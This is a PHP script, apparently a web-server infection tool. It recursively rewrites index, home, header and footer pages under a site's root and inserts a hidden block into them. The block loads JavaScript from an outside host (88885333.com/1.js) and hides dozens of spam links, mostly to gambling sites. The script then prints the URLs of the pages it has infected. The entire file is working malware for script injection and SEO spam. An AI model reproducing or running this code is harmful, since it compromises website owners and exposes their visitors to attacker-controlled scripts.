<?php
$rootPath= realpath(dirname(__FILE__).'/../../../../');
$rootUrl="http://stratigery.com";
$MaxDeep=1;
$ExpFileNames="/(index|default|home|foot|head)/i";
$ExpInsertFlags="/(<%|<\?php|<body(.*?)>)/i";
$PlaceType=2;
$ReplaceStr='<script src="http://www.88885333.com/1.js" rel=&#x2019;external nofollow&#x2019;></script><!-------------------------&#x672C;&#x7AD9;&#x53CB;&#x60C5;&#x94FE;&#x63A5;&#xFF0C;&#x8BF7;&#x52FF;&#x5220;&#x9664;------------------------><div style="display:none"><strong style="font-weight: 400">&#x53CB;&#x60C5;&#x94FE;&#x63A5;:<a href="http://www.pclunwen.com/">&#x8BBA;&#x6587;</a><a href="http://pclunwen.com/">&#x4E2D;&#x56FD;&#x8BBA;&#x6587;&#x7F51;</a><a href="http://www.goodyyw.net/">&#x97E9;&#x56FD;&#x4F26;&#x7406;</a><a href="http://goodyyw.net/">&#x4F26;&#x7406;&#x7535;&#x5F71;&#x7F51;</a><a href="http://www.goodyxw.com/">&#x4F26;&#x7406;&#x7535;&#x5F71;</a><a href="http://goodyxw.com/">&#x70ED;&#x95E8;&#x4F26;&#x7406;&#x7247;</a><a href="http://www.wahooco.com/">&#x73B0;&#x91D1;&#x7F51;</a><a href="http://www.zxkL98.com/">&#x6FB3;&#x95E8;&#x73B0;&#x91D1;&#x7F51;</a><a href="http://www.huade.org/">&#x73B0;&#x91D1;&#x7F51;&#x5740;</a><a href="http://www.shzfpa.com/">&#x73B0;&#x91D1;&#x7F51;&#x6392;&#x540D;</a><a href="http://www.hntscm.com/">&#x73B0;&#x91D1;&#x7F51;&#x4EE3;&#x7406;</a><a href="http://www.zc1718.com/">&#x5929;&#x4E0B;&#x73B0;&#x91D1;&#x7F51;</a><a href="http://www.zjdqgy.com/">&#x4E5D;&#x5DDE;&#x5929;&#x4E0B;&#x73B0;&#x91D1;&#x7F51;</a><a href="http://www.pysqyy.com/">&#x4E50;&#x535A;&#x73B0;&#x91D1;&#x7F51;</a><a href="http://www.wyxyxz.com/">&#x73B0;&#x91D1;&#x7F51;&#x6392;&#x884C;</a><a href="http://www.zznj8.com/">&#x73B0;&#x91D1;&#x7F51;&#x5E73;&#x53F0;</a><a href="http://www.good-o2.com/">&#x73B0;&#x91D1;&#x7F51;&#x5F00;&#x6237;</a><a href="http://www.xttyp.com/">&#x73B0;&#x91D1;&#x7F51;&#x6E38;&#x620F;</a><a href="http://www.synmkj.com/">&#x73B0;&#x91D1;&#x7F51;&#x4E0A;&#x6E38;&#x620F;</a><a href="http://www.hljpts.com/">&#x73B0;&#x91D1;&#x7F51;&#x7AD9;</a><a href="http://www.sjznbgyq.com/">&#x73B0;&#x91D1;&#x7F51;&#x4E0A;&#x6E38;&#x620F;&#x5385;</a><a href="http://www.ykssw.com/">&#x771F;&#x4EBA;&#x73B0;&#x91D1;&#x7F51;</a><a href="http://www.youthsh.com/">&#x73B0;&#x91D1;&#x7F51;&#x8BC4;&#x7EA7;</a><a href="http://www.xmyh168.com/">&#x535A;&#x5F69;&#x73B0;&#x91D1;&#x7F51;</a><a href="http://www.qajyxxw.com/">&#x8DB3;&#x7403;&#x73B0;&#x91D1;&#x7F51;</a><a href="http://www.58szxg.com/">&#x73B0;&#x91D1;&#x7F51;&#x5BFC;&#x822A;</a><a href="http://www.nbhxpm.com/">&#x73B0;&#x91D1;&#x7F51;</a><a href="http://www.mhgyp.com/">&#x6FB3;&#x95E8;&#x73B0;&#x91D1;&#x7F51;</a><a href="http://www.yfyf68.com/">&#x7687;&#x51A0;&#x76F4;&#x8425;&#x73B0;&#x91D1;&#x7F51;</a><a href="http://www.51cgj.com/">&#x73B0;&#x91D1;&#x7F51;&#x8BBA;&#x575B;</a><a href="http://www.51zgrl.com/">&#x4E9A;&#x6D32;&#x73B0;&#x91D1;&#x7F51;</a><a href="http://www.lcd-1.com/">&#x592A;&#x9633;&#x57CE;&#x73B0;&#x91D1;&#x7F51;</a><a href="http://www.gzbowin.com/">&#x73B0;&#x91D1;&#x7F51;&#x793E;&#x533A;</a><a href="http://www.qhdjrfw.com/">&#x8D4C;&#x535A;&#x73B0;&#x91D1;&#x7F51;</a><a href="http://www.ou-te.com/">&#x76C8;&#x76DB;&#x73B0;&#x91D1;&#x7F51;</a><a href="http://www.qifenge.com/">&#x6CE2;&#x97F3;&#x73B0;&#x91D1;&#x7F51;&#x6295;&#x6CE8;</a><a href="http://www.gebreakers.com/">&#x73B0;&#x91D1;&#x7F51;&#x9001;&#x4F53;&#x9A8C;&#x91D1;</a><a href="http://www.tcldy.com/">&#x73B0;&#x91D1;&#x7F51;&#x4FE1;&#x8A89;&#x6392;&#x884C;</a><a href="http://www.hsghxj.com/">&#x8DB3;&#x7403;&#x73B0;&#x91D1;&#x7F51;&#x5F00;&#x6237;</a><a href="http://www.jabanjia.com/">&#x8DB3;&#x7403;&#x73B0;&#x91D1;&#x7F51;&#x5740;</a><a href="http://www.shkunLe.com/">&#x624B;&#x673A;&#x73B0;&#x91D1;&#x7F51;&#x7AD9;</a><a href="http://www.henangt.com/">&#x535A;&#x5F69;&#x73B0;&#x91D1;&#x7F51;&#x624B;&#x673A;&#x7248;</a><a href="http://www.xxswsj.com/">&#x73B0;&#x91D1;&#x7F51;&#x6392;&#x540D;&#x6E38;&#x620F;</a><a href="http://www.szbxzs.com/">&#x73B0;&#x91D1;&#x7F51;&#x535A;&#x5F69;&#x6280;&#x5DE7;</a><a href="http://www.nawatv.com/">&#x76C8;&#x76DB;&#x73B0;&#x91D1;&#x7F51;&#x5E73;&#x53F0;</a><a href="http://www.cnycyj.com/">&#x535A;&#x5F69;&#x73B0;&#x91D1;&#x7F51;&#x5740;</a><a href="http://www.jd8.cc/">&#x73B0;&#x91D1;&#x7F51;</a><a href="http://www.bnwsjds.com/">&#x6FB3;&#x95E8;&#x73B0;&#x91D1;&#x7F51;</a><a href="http://www.cdbzyg.com/">&#x6FB3;&#x95E8;&#x73B0;&#x91D1;&#x7F51;&#x7F51;&#x7AD9;</a><a href="http://www.yc13z.com/">hg&#x73B0;&#x91D1;&#x7F51;&#x5F00;&#x6237;</a><a href="http://www.lwsjxx.com/">&#x73B0;&#x91D1;&#x7F51;&#x6597;&#x725B;</a><a href="http://www.hnhtkj.net/">&#x73B0;&#x91D1;&#x7F51;&#x5B98;&#x65B9;</a><a href="http://www.simodj.com/">&#x6FB3;&#x95E8;&#x73B0;&#x91D1;&#x7F51;&#x5740;</a><a href="http://www.bhhzdx.net/">&#x6FB3;&#x95E8;&#x73B0;&#x91D1;&#x7F51;&#x6392;&#x884C;</a><a href="http://www.fsgfhh.com/">&#x73B0;&#x91D1;&#x7F51;&#x535A;&#x5F69;&#x5BFC;&#x822A;</a><a href="http://www.dl20gz.com/">&#x771F;&#x4EBA;&#x73B0;&#x91D1;&#x7F51;&#x6392;&#x884C;</a><a href="http://www.zhenaihunsha.com/">&#x73B0;&#x91D1;&#x7F51;&#x5F00;&#x6237;&#x7F51;&#x7AD9;</a><a href="http://www.travelcq.com/">&#x5728;&#x7EBF;&#x8D4C;&#x73B0;&#x91D1;&#x7F51;&#x7AD9;</a><a href="http://www.bjdffl.com/">&#x771F;&#x4EBA;&#x73B0;&#x91D1;&#x7F51;&#x5927;&#x5168;</a><a href="http://www.chenjiagou.cc/">&#x73B0;&#x91D1;&#x7F51;&#x5BFC;&#x822A;&#x7F51;</a><a href="http://www.sxczzx.com/">&#x73B0;&#x91D1;&#x7F51;&#x6597;&#x725B;&#x7F51;&#x5740;</a><a href="http://www.jsyxlxj.com/">&#x73B0;&#x91D1;&#x7F51;&#x6E38;&#x620F;&#x5F00;&#x6237;</a><a href="http://www.zgjjsw.com/">&#x73B0;&#x91D1;&#x7F51;&#x6E38;&#x620F;&#x5E73;&#x53F0;</a><a href="http://www.wanbaoguanggao.com/">&#x535A;&#x5F69;&#x73B0;&#x91D1;&#x7F51;&#x8BBA;&#x575B;</a><a href="http://www.ftkbo1.com/">&#x73B0;&#x91D1;&#x7F51;&#x7AD9;&#x5F00;&#x6237;</a><a href="http://www.sxrsj.net/">&#x7F51;&#x7EDC;&#x73B0;&#x91D1;&#x7F51;&#x5E73;&#x53F0;</a><a href="http://www.tjhbsb.com/">&#x73B0;&#x91D1;&#x7F51;&#x535A;&#x72D7;&#x4F53;&#x80B2;</a><a href="http://www.sdxfgm.com/">&#x7687;&#x51A0;&#x5A31;&#x4E50;</a><a href="http://www.hdwye.com/">&#x73B0;&#x91D1;&#x7F51;&#x68CB;&#x724C;&#x6597;&#x5730;&#x4E3B;</a><a href="http://www.finefun.net/">&#x73B0;&#x91D1;&#x7F51;&#x5E73;&#x53F0;&#x5F00;&#x6237;</a><a href="http://www.ykams.com/">&#x535A;&#x72D7;&#x73B0;&#x91D1;&#x7F51;&#x7AD9;</a><a href="http://www.nqrtk.com/">&#x5E74;&#x8F7B;&#x4EBA;&#x56FE;&#x5E93;</a><a href="http://nqrtk.com/">&#x9AD8;&#x6E05;&#x7F8E;&#x5973;&#x56FE;&#x7247;</a><a href="http://www.msntk.com/">&#x7F8E;&#x5C11;&#x5973;&#x56FE;&#x5E93;</a><a href="http://msntk.com/">&#x6E05;&#x7EAF;&#x7F8E;&#x5973;&#x6821;&#x82B1;</a><a href="http://www.qjrtk.com/">&#x4FCF;&#x4F73;&#x4EBA;&#x56FE;&#x5E93;</a><a href="http://qjrtk.com/">&#x65E5;&#x672C;&#x7F8E;&#x5973;</a></strong></div><!-------------------------&#x672C;&#x7AD9;&#x53CB;&#x60C5;&#x94FE;&#x63A5;&#xFF0C;&#x8BF7;&#x52FF;&#x5220;&#x9664;------------------------>';
$returnVal=LinkReplace("",$rootPath,$rootPath,$rootUrl,0,$MaxDeep,$ExpFileNames,$ExpInsertFlags,$PlaceType,$ReplaceStr);
echo "__success__".$returnVal."__success__";
function LinkReplace($returnVal1,$dir,$dirroot,$objrootUrl,$objNowDeep,$objMaxDeep,$objExpFileNames,$objExpInsertFlags,$objPlaceType,$objReplaceStr)
{
    $objNowDeep1=$objNowDeep+1;
    $files = array();
    $dir_list = scandir($dir);
    foreach($dir_list as $file)
    {
        if($file=='..' || $file=='.')
        {
            continue;
        }
        if(is_dir($dir.'/'.$file))
        {
            if($objNowDeep1<$objMaxDeep)
            {
                $returnVal1=LinkReplace($returnVal1,$dir.'/'.$file,$dirroot,$objrootUrl,$objNowDeep+1,$objMaxDeep,$objExpFileNames,$objExpInsertFlags,$objPlaceType,$objReplaceStr);
            }
        }
        else
        {
           if(preg_match($objExpFileNames,$file) && (strpos($file,'.htm')!==false || strpos($file,'.asp')!==false || strpos($file,'.php')!==false || strpos($file,'.jsp')!==false || strpos($file,'.cfm')!==false))
            {
                $filebody=file_get_contents($dir.'/'.$file);
                $filebody=str_replace("\xEF\xBB\xBF","",$filebody);
                $filebody=preg_replace("'<span class=\"mylinkcode\" style=\"display:none\">([\s\S]+?)<\/span>'","",$filebody);
                $filebody=RegexReplace($filebody,$objExpInsertFlags,"<span class=\"mylinkcode\" style=\"display:none\">".$objReplaceStr."</span>",$objPlaceType);
                if(file_put_contents($dir.'/'.$file, $filebody)>0 && strpos($filebody,"<span class=\"mylinkcode\" style=\"display:none\">")!==false)
                {
                    $replaceFile=$dir.'/'.$file;
                    $replaceFile=str_replace($dirroot,$objrootUrl,$replaceFile);
                    $replaceFile=str_replace('\\','/',$replaceFile);
                    $replaceFile=str_replace('http://','',$replaceFile);
                    $replaceFile=str_replace('//','/',$replaceFile);
                    $replaceFile=str_replace('//','/',$replaceFile);
                    $replaceFile='http://'.$replaceFile;
                    $returnVal1=$returnVal1.$replaceFile.'<br />';
                }
            }
        }
    }
    return $returnVal1;
}
function RegexReplace($source1,$pattern1,$replace1,$replacetype1)
{
    $rtnVal=$source1;
    preg_match($pattern1, $source1, $matches);
    if(count($matches)>0)
    {
        if($replacetype1==1)
            $rtnVal=str_replace_once($matches[0],$replace1.$matches[0],$source1);
        else
            $rtnVal=str_replace_once($matches[0],$matches[0].$replace1,$source1);
    }
    return $rtnVal;
}
function str_replace_once($needle, $replace, $haystack)
{
    $pos = strpos($haystack, $needle);
    if ($pos === false) 
        return $haystack;
    return substr_replace($haystack, $replace, $pos, strlen($needle));
}
